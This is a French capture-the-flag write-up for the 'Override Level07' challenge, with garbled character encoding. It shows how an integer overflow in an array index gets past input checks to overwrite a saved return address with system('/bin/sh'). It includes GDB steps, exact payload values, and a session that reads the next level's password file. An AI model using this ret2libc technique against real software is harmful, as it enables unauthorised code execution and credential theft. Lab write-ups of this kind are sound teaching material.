# ğŸ“˜ Override â€“ Level07

## ğŸ“ Description

Ce niveau prÃ©sente un service de stockage de nombres, manipulant un tableau local de 100 entiers.
L'objectif est dâ€™exploiter une **Ã©criture hors limites** causÃ©e par un **integer overflow** dans le calcul de lâ€™index.

En contournant les protections intÃ©grÃ©es et en ciblant lâ€™adresse de retour sur la stack, nous pouvons rediriger l'exÃ©cution vers `system("/bin/sh")`.

---

# ğŸ” Analyse du binaire

## Fonction vulnÃ©rable : `store_number()`

```c
printf(" Number: ");
uVar1 = get_unum();        // nombre Ã  stocker

printf(" Index: ");
uVar2 = get_unum();        // index choisi par l'utilisateur

*(uint *)(uVar2 * 4 + param_1) = uVar1;  // âš ï¸ aucune vÃ©rification !
```

### Ce qui rend lâ€™exploitation possible :

1. **Lâ€™index est un unsigned int** â†’ il peut overflow.
2. `uVar2 * 4` overflow en 32 bits â†’ permet dâ€™Ã©crire nâ€™importe oÃ¹ dans la stack.
3. On peut Ã©craser **lâ€™adresse de retour (EIP)** du `main()`.

### Restrictions du programme

Le programme interdit :

* les index multiples de **3**
* les nombres dont le byte haut vaut `0xB7`
  (ce qui Ã©vite d'Ã©crire dans `.plt` et `.got`)

Mais ces restrictions sont **contournables via integer overflow**.

---

# ğŸ” Localisation du tableau

Dans GDB :

```
(gdb) b store_number
(gdb) r
(gdb) p/x *(int*)($ebp + 8)
$1 = 0xffffd424
```

ğŸ‘‰ Voici lâ€™adresse **param_1**, c'est-Ã -dire **local_1bc**.

---

# ğŸ¯ Trouver lâ€™adresse de retour (EIP)

On place un breakpoint juste avant le `ret` :

```
(gdb) b *0x080489f1
```

Puis on observe :

```
(gdb) x/wx $esp
0xffffd5ec:  0xf7e45513    â† EIP sauvegardÃ©
```

Distance entre tableau et EIP :

```
0xffffd5ec - 0xffffd424 = 0x1C8 = 456 bytes
```

Comme chaque Ã©lÃ©ment est un uint (4 bytes) :

```
456 / 4 = 114
```

ğŸ¯ **index = 114 Ã©crase directement EIP**
Mais câ€™est interdit : `114 % 3 == 0`.

---

# ğŸ’¡ Contournement via integer overflow

On doit choisir un index `I` tel que :

```
(I * 4) mod 2Â³Â² == 456
```

Or :

```
I = (2Â³Â² / 4) + 114
  = 1073741824 + 114
  = 1073741938
```

VÃ©rification :

```
1073741938 * 4 = 0x1000001C8 â†’ modulo 2Â³Â² â†’ 456
```

âœ” Cet index nâ€™est **pas multiple de 3** â†’ acceptÃ©.

---

# ğŸ¯ Trouver les adresses utiles (system + "/bin/sh")

```
(gdb) info functions system
0xf7e6aed0 = system

(gdb) find 0xf7e2c000,0xf7fd0000, "/bin/sh"
0xf7f897ec = /bin/sh
```

Nous avons donc :

* **system** = `4159090384` (0xf7e6aed0)
* **"/bin/sh"** = `4160264172` (0xf7f897ec)

---

# ğŸ’¥ Exploitation finale

### 1ï¸âƒ£ Ã‰craser EIP â†’ mettre lâ€™adresse de `system`

```
Input command: store
 Number: 4159090384     â† system()
 Index: 1073741938       â† overflow vers EIP (114)
```

### 2ï¸âƒ£ Placer lâ€™argument pour `system("/bin/sh")`

`system()` sâ€™attend Ã  trouver lâ€™argument juste aprÃ¨s lâ€™EIP sur la stack.

```
EIP    â†’ system
[+4]   â†’ /bin/sh argument
```

EIP est Ã  index **114**, donc lâ€™argument est Ã  **index 116**.

Car apres un system call il attends une adresse de retour a index 115.

```
Index = 116
```

Payload :

```
Input command: store
 Number: 4160264172     â† "/bin/sh"
 Index: 116
```

### 3ï¸âƒ£ Quitter pour dÃ©clencher le retour

```
Input command: quit
$ whoami
level08
```

ğŸ”¥ **Shell obtenu !**

---

# ğŸ§ª Capture de la session complÃ¨te

```
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully

Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

---

# âœ… RÃ©sumÃ© du Level07

| Ã‰lÃ©ment                 | Valeur                                 |
| ----------------------- | -------------------------------------- |
| VulnÃ©rabilitÃ©           | Integer overflow + write-out-of-bounds |
| Tableau (`local_1bc`)   | 0xffffd424                             |
| Adresse de retour (EIP) | 0xffffd5ec                             |
| Distance                | 456 bytes â†’ index 114                  |
| Index overflow final    | **1073741938**                         |
| Adresse de system()     | 0xf7e6aed0                             |
| Adresse "/bin/sh"       | 0xf7f897ec                             |
| Argument index          | 116                                    |
| Shell obtenu ?          | âœ” Oui                                  |